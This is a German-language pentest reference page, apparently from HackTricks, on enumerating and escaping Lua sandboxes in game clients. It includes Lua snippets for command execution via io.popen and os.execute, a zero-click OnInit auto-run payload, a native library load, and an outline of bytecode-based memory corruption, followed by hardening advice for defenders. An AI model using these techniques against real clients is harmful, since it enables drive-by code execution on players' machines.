# Lua-Sandboxes umgehen (eingebettete VMs, Game-Clients)

{{#include ../../../banners/hacktricks-training.md}}

Diese Seite sammelt praktische Techniken, um in Anwendungen eingebettete Lua-"Sandboxes" (insbesondere in Game-Clients, Plugins oder In-App-Scripting-Engines) zu enumerieren und zu verlassen. Viele Engines stellen eine eingeschränkte Lua-Umgebung bereit, lassen jedoch mächtige Globals erreichbar, die beliebige command execution oder sogar native memory corruption ermöglichen, wenn bytecode loaders verfügbar sind.

Wichtige Ideen:
- Behandle die VM als unbekannte Umgebung: Enum­eriere _G und finde heraus, welche gefährlichen Primitives erreichbar sind.
- Wenn stdout/print blockiert ist, missbrauche einen beliebigen UI/IPC-Kanal innerhalb der VM als output sink, um Ergebnisse zu beobachten.
- Wenn io/os verfügbar ist, hast du oft direkte command execution (io.popen, os.execute).
- Wenn load/loadstring/loadfile verfügbar sind, kann das Ausführen von manipuliertem Lua-Bytecode in einigen Versionen die memory safety umgehen (≤5.1-Verifier sind umgehbar; 5.2 hat den Verifier entfernt) und so fortgeschrittene Exploitation ermöglichen.

## Die sandboxed Umgebung enumerieren

- Gib die globale Umgebung aus, um erreichbare Tabellen/Funktionen zu erfassen:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Wenn kein print() verfügbar ist, zweckentfremde In-VM-Kanäle. Beispiel aus einer MMO-Housing-Script-VM, in der die Chat-Ausgabe erst nach einem Sound-Aufruf funktioniert; das Folgende erstellt eine zuverlässige Ausgabefunktion:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Verallgemeinere dieses Muster für dein Ziel: Jedes Textfeld, jeder Toast, jeder Logger oder jeder UI-Callback, der Strings akzeptiert, kann als stdout für Reconnaissance dienen.

## Direkte Befehlsausführung, wenn io/os offengelegt ist

Wenn die Sandbox weiterhin die Standardbibliotheken io oder os offenlegt, hast du wahrscheinlich sofortige Befehlsausführung:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Hinweise:

- Die Ausführung erfolgt innerhalb des Client-Prozesses; viele Anti-Cheat-/Anti-Debugging-Schichten, die externe Debugger blockieren, verhindern keine Prozesserstellung innerhalb der VM.
- Prüfe außerdem: package.loadlib (Laden beliebiger DLLs/.so-Dateien), require mit nativen Modulen, LuaJITs ffi (falls vorhanden) sowie die debug-Bibliothek (kann Berechtigungen innerhalb der VM erhöhen).

## Zero-click triggers via auto-run callbacks

Wenn die Host-Anwendung Skripte an Clients überträgt und die VM Auto-Run-Hooks (z. B. OnInit/OnLoad/OnEnter) bereitstellt, platziere dort deine Payload für eine Drive-by-Kompromittierung, sobald das Skript geladen wird:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Jeder gleichwertige callback (OnLoad, OnEnter usw.) verallgemeinert diese Technik, wenn Scripts automatisch an den Client übertragen und dort ausgeführt werden.

## Gefährliche Primitives, nach denen während der Recon gesucht werden sollte

Bei der Enumeration von _G sollte insbesondere nach Folgendem gesucht werden:
- io, os: io.popen, os.execute, Datei-I/O, Zugriff auf Umgebungsvariablen.
- load, loadstring, loadfile, dofile: Ausführung von Source oder Bytecode; unterstützt das Laden nicht vertrauenswürdiger Bytecodes.
- package, package.loadlib, require: Laden dynamischer Libraries und Moduloberfläche.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo und Hooks.
- Nur LuaJIT: ffi.cdef, ffi.load zum direkten Aufrufen nativen Codes.

Minimale Nutzungsbeispiele (falls erreichbar):

Lua's Loader-API wurde zwischen den Versionen geändert: In Lua 5.1 liest `load` von einer Reader-Funktion und `loadstring` von einem String; Lua 5.2 akzeptiert `load` entweder einen String oder eine Reader-Funktion, und `loadstring` ist als Äquivalent deprecated.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optionale Eskalation: Missbrauch von Lua-Bytecode-Loadern

Wenn load/loadstring/loadfile erreichbar, io/os jedoch eingeschränkt sind, kann die Ausführung von speziell erstelltem Lua-Bytecode zu Speicher-Offenlegung und Speicher-Korruptionsprimitiven führen. Wichtige Fakten:
- Lua ≤ 5.1 wurde mit einem Bytecode-Verifizierer ausgeliefert, für den bekannte Bypasses existieren.<sup>[[4]](#references)</sup>
- Lua 5.2 entfernte den Verifizierer vollständig (offizielle Haltung: Anwendungen sollten vorkompilierte Chunks einfach ablehnen), wodurch sich die Angriffsfläche vergrößert, wenn das Laden von Bytecode nicht verboten wird.<sup>[[2]](#references)[[3]](#references)</sup>
- Typische Abläufe: Pointer über die In-VM-Ausgabe leaken, Bytecode erstellen, um Type Confusions zu erzeugen (z. B. im Zusammenhang mit FORLOOP oder anderen Opcodes), und anschließend zu beliebigem Lesen/Schreiben oder nativer Codeausführung pivotieren.<sup>[[2]](#references)[[4]](#references)</sup>

Dieser Pfad ist Engine-/Versions-spezifisch und erfordert RE. Siehe die Referenzen für ausführliche Analysen, Exploitation-Primitiven und Beispiele für Gadgets in Spielen.

## Hinweise zur Erkennung und Härtung (für Defender)

- Serverseitig: User-Scripts ablehnen oder umschreiben; sichere APIs allowlisten; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug und ffi entfernen oder an leere Bindings binden.
- Clientseitig: Lua mit einem minimalen _ENV ausführen, das Laden von Bytecode verbieten, wieder einen strikten Bytecode-Verifizierer oder Signaturprüfungen einführen und die Prozesserstellung aus dem Client-Prozess blockieren.
- Telemetrie: Auf die Erstellung eines Child-Prozesses durch gameclient kurz nach dem Laden eines Scripts alerten; dies mit UI-/Chat-/Script-Ereignissen korrelieren.

## References

- [1] [Dieses Haus ist verflucht: Eine zehn Jahre alte RCE im AION-Client (Lua-VM für Housing)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Entschlüsselung der Lua-Sicherheitslücken in Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Diskussion über die Abschaffung des Bytecode-Verifizierers](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Ausnutzung von Lua-5.1-Bytecode (Gist mit Verifier-Bypasses/Notizen)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua-5.1-Referenzhandbuch](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua-5.2-Referenzhandbuch](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
